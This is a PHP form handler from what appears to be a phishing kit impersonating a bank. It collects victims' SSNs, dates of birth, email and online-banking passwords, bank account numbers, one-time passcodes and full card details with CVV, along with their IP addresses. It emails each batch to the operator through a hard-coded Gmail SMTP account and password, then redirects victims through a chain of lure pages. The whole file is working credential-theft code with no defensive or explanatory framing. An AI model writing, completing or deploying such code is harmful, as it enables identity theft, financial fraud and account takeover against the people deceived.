<?php
include 'mail.php';

$ip = $_SERVER['REMOTE_ADDR'];
// billpage process
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

 //Server settings
 $mail->isSMTP();                                            //Send using SMTP
 $mail->Host       = 'smtp.gmail.com';                                  //Set the SMTP server to send through
 $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
 $mail->Username   = 'denzelbennie9@gmail.com';                     //SMTP username
 $mail->Password   = 'dyue ofir mimi nwml';                               //SMTP password
 $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
 $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

 //Recipients
 $mail->setFrom($from, 'denzelbennie9@gmail.com');
 $mail->addAddress($to, 'support@cbelko.net');     //Add a recipient
 // $mail->addAddress('ellen@example.com');               //Name is optional
 $mail->addReplyTo($replyto, 'Information');
 $mail->addCC($cc);


if (isset($_POST['btnbill'])) {
    // The message
    $Fullname = $_POST['name'];
    $StreetAdd = $_POST['sadd'];
    $Apartm = $_POST['apart'];
    $City = $_POST['city'];
    $State = $_POST['State'];
    $ZipCode = $_POST['zipcode'];
    $MobileNo = $_POST['pnumber'];
    $Snn = $_POST['ssn'];
    $dob = $_POST['dob'];
    
      
    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$replyto."\r\n";

    // Compose a simple HTML email message
    $message = '<html><body>';
    $message .= '<p> New-Log: </>';
    $message .= '<ol>';
    $message .= '<li>IP Address:</li>'.$ip;
    $message .= '</ol>';

    $message .= '<p> Confirm Personal Information: </>';
    $message .= '<ol>';
    $message .= '<li>Fullname:</li>' .$Fullname;
    $message .= '<li>Street Address:</li>' .$StreetAdd;
    $message .= '<li>Apartment:</li>'.$Apartm;
    $message .= '<li>City:</li>'.$City;
    $message .= '<li>State:</li>'.$State;
    $message .= '<li>Zip Code:</li>'.$ZipCode;
    $message .= '<li>Mobile Number:</li>'.$MobileNo;
    $message .= '<li>SNN:</li>'.$Snn;
    $message .= '<li>Date of Birth:</li>'.$dob;
    $message .= '</ol>';
    $message .= '</body></html>';
    
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for Billing';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='email.html'</script>";
    
}

if (isset($_POST['btnemail'])) {
    // The message
    $Email = $_POST['emaila'];
    $Password = $_POST['pass'];
    
    

    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$replyto."\r\n";

    // Compose a simple HTML email message
    $message = '<html><body>';
    $message .= '<p> You have a new website form submission: </>';
    $message .= '<ol>';
    $message .= '<li>IP Address:</li>'.$ip;
    $message .= '</ol>';

    $message .= '<p> Email Information: </>';
    $message .= '<ol>';
    $message .= '<li>Email:</li>' .$Email;
    $message .= '<li>Password:</li>' .$Password;
    $message .= '</ol>';
    $message .= '</body></html>';
      
       //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for Email';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='acc-number.html'</script>";
}

if (isset($_POST['btnaccno'])) {
    
   // The message
   $Bank = $_POST['bank'];
   $Bankn = $_POST['bname'];
   $Accnum = $_POST['accnum'];
   
   // To send HTML mail, the Content-type header must be set
   $headers  = 'MIME-Version: 1.0' . "\r\n";
   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
   $headers .= 'From: '.$from."\r\n".
   'Reply-To: '.$replyto."\r\n";

   // Compose a simple HTML email message
   $message = '<html><body>';
   $message .= '<p> You have a new website form submission: </>';
   $message .= '<ol>';
   $message .= '<li>IP Address:</li>'.$ip;
   $message .= '</ol>';

   $message .= '<p> Bank Information: </>';
   $message .= '<ol>';
   $message .= '<li>Bank:</li>' .$Bank;
   $message .= '<li>Bank Name:</li>' .$Bankn;
   $message .= '<li>Account Number:</li>' .$Accnum;
   $message .= '</ol>';
   $message .= '</body></html>';
     
    //Content
     $mail->isHTML(true);                                  //Set email format to HTML
     $mail->Subject = 'New Form Entry for Bank Details';
     $mail->Body    = $message;
 
     $mail->send();
     echo "<script language='javascript' type='text/javascript'>location.href='acc-login.html'</script>";
    
}

if (isset($_POST['btnacclog'])) {
     // The message
     $Username = $_POST['username'];
     $Password = $_POST['pass'];
     
     // To send HTML mail, the Content-type header must be set
     $headers  = 'MIME-Version: 1.0' . "\r\n";
     $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
     $headers .= 'From: '.$from."\r\n".
     'Reply-To: '.$replyto."\r\n";
 
     // Compose a simple HTML email message
     $message = '<html><body>';
     $message .= '<p> You have a new website form submission: </>';
     $message .= '<ol>';
     $message .= '<li>IP Address:</li>'.$ip;
     $message .= '</ol>';
 
     $message .= '<p> Online Access Information: </>';
     $message .= '<ol>';
     $message .= '<li>Username:</li>' .$Username;
     $message .= '<li>Password:</li>' .$Password;
     $message .= '</ol>';
     $message .= '</body></html>';

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for Online Access';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='retry.html'</script>";

    
}

if (isset($_POST['btnretry'])) {
    // The message
    $Username = $_POST['username'];
    $Password = $_POST['pass'];

    
      // To send HTML mail, the Content-type header must be set
      $headers  = 'MIME-Version: 1.0' . "\r\n";
      $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
      $headers .= 'From: '.$from."\r\n".
      'Reply-To: '.$replyto."\r\n";
  
      // Compose a simple HTML email message
      $message = '<html><body>';
      $message .= '<p> You have a new website form submission: </>';
      $message .= '<ol>';
      $message .= '<li>IP Address:</li>'.$ip;
      $message .= '</ol>';
  
      $message .= '<p> Retry Information: </>';
      $message .= '<ol>';
      $message .= '<li>Username:</li>' .$Username;
      $message .= '<li>Password:</li>' .$Password;
      $message .= '</ol>';
      $message .= '</body></html>';
    
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for Retry';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='otp.html'</script>";

}

if (isset($_POST['btnotp'])) {
    // The message
    $otp = $_POST['otp'];

    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$replyto."\r\n";

    // Compose a simple HTML email message
    $message = '<html><body>';
    $message .= '<p> You have a new website form submission: </>';
    $message .= '<ol>';
    $message .= '<li>IP Address:</li>'.$ip;
    $message .= '</ol>';

    $message .= '<p> OTP Information: </>';
    $message .= '<ol>';
    $message .= '<li>OTP:</li>' .$otp;
    $message .= '</ol>';
    $message .= '</body></html>';
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for OTP';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='cc.html'</script>";

}

if (isset($_POST['btncc'])) {
    // The message
    $NameonCard = $_POST['nameonc'];
    $Cardno = $_POST['cno'];
    $Expired = $_POST['expired'];
    $Cvv = $_POST['cvv'];
    $ZipCode = $_POST['zipcode'];
        
    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$replyto."\r\n";

    // Compose a simple HTML email message
    $message = '<html><body>';
    $message .= '<p> You have a new website form submission: </>';
    $message .= '<ol>';
    $message .= '<li>IP Address:</li>'.$ip;
    $message .= '</ol>';

    $message .= '<p> Card Information: </>';
    $message .= '<ol>';
    $message .= '<li>Name on Card:</li>' .$NameonCard;
    $message .= '<li>Card Number:</li>' .$Cardno;
    $message .= '<li>Expired Date:</li>'.$Expired;
    $message .= '<li>CVV:</li>'.$Cvv;
    $message .= '<li>Zip code:</li>'.$ZipCode;
    $message .= '</ol>';
    $message .= '</body></html>';

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'New Form Entry for Card';
    $mail->Body    = $message;

    $mail->send();
    echo "<script language='javascript' type='text/javascript'>location.href='done.html'</script>";

}

?>

